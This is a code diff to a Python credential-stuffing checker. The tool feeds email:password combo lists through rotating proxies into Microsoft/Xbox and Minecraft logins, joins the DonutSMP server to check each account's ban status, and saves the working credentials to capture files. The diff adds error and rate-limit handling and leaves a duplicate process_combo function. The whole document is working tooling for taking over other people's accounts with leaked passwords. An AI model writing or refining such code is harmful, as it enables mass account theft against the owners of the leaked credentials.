@@ -231,6 +231,83 @@ def get_mc_profile(mc_access_token):
     data = r.json()
     return data["name"], data["id"]
 
+import requests.exceptions
+
+def process_combo(combo, folder, config):
+    try:
+        email, password = combo.strip().split(":", 1)
+        session = requests.Session()
+        session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+        })
+        if proxytype != "'4'":
+            proxy = getproxy()
+            if proxy:
+                session.proxies = proxy if isinstance(proxy, dict) else {'http': proxy, 'https': proxy}
+        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
+        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
+        if not token or token == "None":
+            print(Fore.RED + f"[BAD] {combo} | Status: invalid credentials or 2FA" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", combo)
+            time.sleep(0.1)
+            return
+        try:
+            xbox_token, uhs = xbox_authenticate(token)
+        except requests.exceptions.HTTPError as e:
+            if e.response.status_code == 401:
+                print(Fore.RED + f"[BAD] {combo} | Status: Xbox authentication failed (401 Unauthorized)" + Style.RESET_ALL)
+            elif e.response.status_code == 429:
+                print(Fore.YELLOW + f"[TRY LATER] {combo} | Status: Xbox rate limited (429)" + Style.RESET_ALL)
+            else:
+                print(Fore.RED + f"[BAD] {combo} | Status: Xbox auth error | {e}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"{combo} | Status: Xbox auth error | {e}")
+            time.sleep(0.1)
+            return
+        try:
+            xsts_token, uhs = xbox_xsts(xbox_token)
+        except requests.exceptions.HTTPError as e:
+            if e.response.status_code == 401:
+                print(Fore.RED + f"[BAD] {combo} | Status: XSTS failed (401 Unauthorized)" + Style.RESET_ALL)
+            elif e.response.status_code == 429:
+                print(Fore.YELLOW + f"[TRY LATER] {combo} | Status: XSTS rate limited (429)" + Style.RESET_ALL)
+            else:
+                print(Fore.RED + f"[BAD] {combo} | Status: XSTS error | {e}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"{combo} | Status: XSTS error | {e}")
+            time.sleep(0.1)
+            return
+        try:
+            mc_access_token = get_mc_access_token(uhs, xsts_token)
+        except requests.exceptions.HTTPError as e:
+            if e.response.status_code == 403:
+                print(Fore.RED + f"[BAD] {combo} | Status: Not a Minecraft/Xbox account or region-locked (403)" + Style.RESET_ALL)
+            elif e.response.status_code == 429:
+                print(Fore.YELLOW + f"[TRY LATER] {combo} | Status: MC rate limited (429)" + Style.RESET_ALL)
+            else:
+                print(Fore.RED + f"[BAD] {combo} | Status: MC access error | {e}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"{combo} | Status: MC access error | {e}")
+            time.sleep(0.1)
+            return
+        try:
+            mc_name, mc_uuid = get_mc_profile(mc_access_token)
+        except requests.exceptions.HTTPError as e:
+            if e.response.status_code == 404:
+                print(Fore.RED + f"[BAD] {combo} | Status: No Minecraft profile (account never bought MC)" + Style.RESET_ALL)
+            else:
+                print(Fore.RED + f"[BAD] {combo} | Status: MC profile error | {e}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"{combo} | Status: MC profile error | {e}")
+            time.sleep(0.1)
+            return
+        join_donutsmp_bot(mc_name, mc_uuid, mc_access_token, combo, folder, config)
+    except Exception as e:
+        error_str = str(e)
+        if "429" in error_str or "Too Many Requests" in error_str:
+            print(Fore.YELLOW + f"[TRY LATER] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"[TRY LATER] {combo} | Status: error | {error_str}")
+        else:
+            print(Fore.RED + f"[BAD] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"{combo} | Status: error | {error_str}")
+        time.sleep(0.1)
+
 def join_donutsmp_bot(mc_name, mc_uuid, mc_token, combo, folder, config):
     result = None
     disconnect_message = None
@@ -271,8 +348,9 @@ def join_donutsmp_bot(mc_name, mc_uuid, mc_token, combo, folder, config):
         elif result == "banned":
             if disconnect_message:
                 clean = re.sub(r'§.', '', disconnect_message)
-                reason_match = re.search(r'(You are .+?)(?:\\n|\n)', clean)
-                reason = reason_match.group(1).strip() if reason_match else ""
+                # Try to extract reason, time left, ban id
+                reason_match = re.search(r'(You are .+?)(?:\\n|\n|$)', clean)
+                reason = reason_match.group(1).strip() if reason_match else "banned (unknown reason)"
                 time_match = re.search(r'Time Left: ([^\n\\]+)', clean)
                 time_left = time_match.group(1).strip() if time_match else ""
                 banid_match = re.search(r'Ban ID: ([^\n\\]+)', clean)
@@ -285,8 +363,8 @@ def join_donutsmp_bot(mc_name, mc_uuid, mc_token, combo, folder, config):
                     cap = Capture(email, password, mc_name, "banned", reason, time_left, ban_id)
                     save_result(folder, "Capture.txt", cap.builder())
             else:
-                print(Fore.RED + f"[BANNED] {combo} | Logged in as {mc_name} | Status: banned" + Style.RESET_ALL)
-                save_result(folder, "Banned.txt", f"{combo} | {mc_name} | Status: banned")
+                print(Fore.RED + f"[BANNED] {combo} | Logged in as {mc_name} | Status: banned (no message)" + Style.RESET_ALL)
+                save_result(folder, "Banned.txt", f"{combo} | {mc_name} | Status: banned (no message)")
         else:
             print(Fore.RED + f"[BAD] {combo} | Status: unknown error" + Style.RESET_ALL)
             save_result(folder, "Bad.txt", f"{combo} | Status: unknown error")
@@ -295,19 +373,21 @@ def join_donutsmp_bot(mc_name, mc_uuid, mc_token, combo, folder, config):
         error_str = str(e)
         # Special handling for too many requests
         if "429" in error_str or "Too Many Requests" in error_str:
-            print(Fore.RED + f"[BAD] {combo} | Status: too many Request" + Style.RESET_ALL)
-            save_result(folder, "Bad.txt", f"{combo} | Status: too many Request")
+            print(Fore.RED + f"[BAD] {combo} | Status: too many requests" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"{combo} | Status: too many requests")
         else:
             print(Fore.RED + f"[BAD] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
             save_result(folder, "Bad.txt", f"{combo} | Status: error | {error_str}")
         time.sleep(0.1)
+
+# ...existing code...       
 
 def process_combo(combo, folder, config):
     try:
         email, password = combo.strip().split(":", 1)
         session = requests.Session()
         session.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         })
         if proxytype != "'4'":
             proxy = getproxy()
@@ -315,21 +395,63 @@ def process_combo(combo, folder, config):
                 session.proxies = proxy if isinstance(proxy, dict) else {'http': proxy, 'https': proxy}
         urlPost, sFTTag, session = get_urlPost_sFTTag(session)
         token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
-        if not token:
-            print(Fore.RED + f"[BAD] {combo} | Status: login_failed" + Style.RESET_ALL)
+        if not token or token == "None":
+            print(Fore.RED + f"[BAD] {combo} | Status: invalid credentials or 2FA" + Style.RESET_ALL)
             save_result(folder, "Bad.txt", combo)
             time.sleep(0.1)
             return
-        xbox_token, uhs = xbox_authenticate(token)
-        xsts_token, uhs = xbox_xsts(xbox_token)
-        mc_access_token = get_mc_access_token(uhs, xsts_token)
-        mc_name, mc_uuid = get_mc_profile(mc_access_token)
+        try:
+            xbox_token, uhs = xbox_authenticate(token)
+        except requests.exceptions.HTTPError as e:
+            if e.response.status_code == 401:
+                print(Fore.RED + f"[BAD] {combo} | Status: Xbox authentication failed (401 Unauthorized)" + Style.RESET_ALL)
+            elif e.response.status_code == 429:
+                print(Fore.YELLOW + f"[TRY LATER] {combo} | Status: Xbox rate limited (429)" + Style.RESET_ALL)
+            else:
+                print(Fore.RED + f"[BAD] {combo} | Status: Xbox auth error | {e}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"{combo} | Status: Xbox auth error | {e}")
+            time.sleep(0.1)
+            return
+        try:
+            xsts_token, uhs = xbox_xsts(xbox_token)
+        except requests.exceptions.HTTPError as e:
+            if e.response.status_code == 401:
+                print(Fore.RED + f"[BAD] {combo} | Status: XSTS failed (401 Unauthorized)" + Style.RESET_ALL)
+            elif e.response.status_code == 429:
+                print(Fore.YELLOW + f"[TRY LATER] {combo} | Status: XSTS rate limited (429)" + Style.RESET_ALL)
+            else:
+                print(Fore.RED + f"[BAD] {combo} | Status: XSTS error | {e}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"{combo} | Status: XSTS error | {e}")
+            time.sleep(0.1)
+            return
+        try:
+            mc_access_token = get_mc_access_token(uhs, xsts_token)
+        except requests.exceptions.HTTPError as e:
+            if e.response.status_code == 403:
+                print(Fore.RED + f"[BAD] {combo} | Status: Not a Minecraft/Xbox account or region-locked (403)" + Style.RESET_ALL)
+            elif e.response.status_code == 429:
+                print(Fore.YELLOW + f"[TRY LATER] {combo} | Status: MC rate limited (429)" + Style.RESET_ALL)
+            else:
+                print(Fore.RED + f"[BAD] {combo} | Status: MC access error | {e}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"{combo} | Status: MC access error | {e}")
+            time.sleep(0.1)
+            return
+        try:
+            mc_name, mc_uuid = get_mc_profile(mc_access_token)
+        except requests.exceptions.HTTPError as e:
+            if e.response.status_code == 404:
+                print(Fore.RED + f"[BAD] {combo} | Status: No Minecraft profile (account never bought MC)" + Style.RESET_ALL)
+            else:
+                print(Fore.RED + f"[BAD] {combo} | Status: MC profile error | {e}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"{combo} | Status: MC profile error | {e}")
+            time.sleep(0.1)
+            return
         join_donutsmp_bot(mc_name, mc_uuid, mc_access_token, combo, folder, config)
     except Exception as e:
         error_str = str(e)
         if "429" in error_str or "Too Many Requests" in error_str:
-            print(Fore.YELLOW + f"[TRY LATER ] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
-            save_result(folder, "Bad.txt", f"[TRY LATER ] {combo} | Status: error | {error_str}")
+            print(Fore.YELLOW + f"[TRY LATER] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
+            save_result(folder, "Bad.txt", f"[TRY LATER] {combo} | Status: error | {error_str}")
         else:
             print(Fore.RED + f"[BAD] {combo} | Status: error | {error_str}" + Style.RESET_ALL)
             save_result(folder, "Bad.txt", f"{combo} | Status: error | {error_str}")
